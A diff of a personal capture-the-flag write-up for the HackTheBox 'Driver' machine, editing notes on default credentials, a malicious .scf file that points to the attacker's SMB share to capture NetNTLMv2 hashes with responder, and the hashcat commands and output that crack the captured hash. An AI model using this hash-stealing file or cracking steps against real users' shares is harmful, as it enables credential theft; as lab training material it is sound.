@@ -35,15 +35,14 @@ created: 2025-09-06
 **📚 Learned:**  
 
 - [[Interacting with Users#SCF on a File Share|NetNTLMv2 hash stealing with malicious .scf file on file share reviewed by user]].
-- Read the `PowerShell` history file; it may contain clues.
-- If a `metasploit` module hangs or errors out, we can try migrating to the `explorer.exe` process. Use `ps` and `migrate <PID>`. This happens when the session runs in a non-interactive process; `explorer.exe` is always interactive.
+- Read the `PowerShell` history file, it may contain clues.
+- If a `metasploit` module hangs or errors out, we can try migrating to the `explorer.exe` process. Use `ps` and `migrate <PID>`. This happens when the session runs in a non-interactive process, and `explorer.exe` is always interactive.
 
 ----
 
 ## 🌐 Port Scan
 
 - **TCP**: 80, 135, 445, 5985
-- **UDP**: None
 
 ---
 
@@ -57,9 +56,6 @@ The website had basic `HTTP` authentication enabled. I just tried `admin`:`admin
 Browsing the website, I found this:
 
 ![[Pasted image 20250905231514.png]]
-
->[!note]
->I also tried looking for vulnerabilities in the other services and even for the `OS`, which I gathered using `enum4linux-ng`.
 
 I clicked the links and the only one that went somewhere else was the "Firmware Updates" button. It redirected me to this:
 
@@ -75,7 +71,7 @@ I tried fuzzing for directories but there was only the `/images/` directory, whi
 
 I took a hint from `HackTheBox`'s guided mode, which pointed to stealing an `NTLM` hash. That made everything click.
 
-Every clue I needed was in front of my eyes:
+These hints give it away:
 
 ![[Pasted image 20250905232007.png]]
 
@@ -91,17 +87,14 @@ IconFile=\\10.10.14.11\share\legit.ico
 Command=ToggleDesktop
 ```
 
->[!note]
->I tried lots of web vulnerabilities on the upload form, but none worked.
-
 I started `responder` and uploaded the file:
 
 ![[Pasted image 20250905232528.png]]
 
-Next, I cracked it (don't forget `hashcat` mode 5600 for `NetNTLMv2`).
+Next, I cracked it.
 
 ```shell
-.\hashcat.exe -a 0 -m 5600 .\hashes.txt .\rockyou.txt -r .\rules\best64.rule -O -w 4
+hashcat hash.txt $ROCKYOU
 
 TONY::DRIVER:7267440768eeb2df:e69e5755689858dde099a11c6da6f9cf:0101000000000000009383a0ba1edc0137d297117caf58ab000000000200080053004e003200330001001e00570049004e002d0057004f0034004b0059005a004e00330049004700590004003400570049004e002d0057004f0034004b0059005a004e0033004900470059002e0053004e00320033002e004c004f00430041004c000300140053004e00320033002e004c004f00430041004c000500140053004e00320033002e004c004f00430041004c0007000800009383a0ba1edc010600040002000000080030003000000000000000000000000020000013089a14126e33cadf2ab2f18fe8f7a4ae78cafd304d4cf7824e1314b1e5071e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003100000000000000000000000000:liltony
 ```
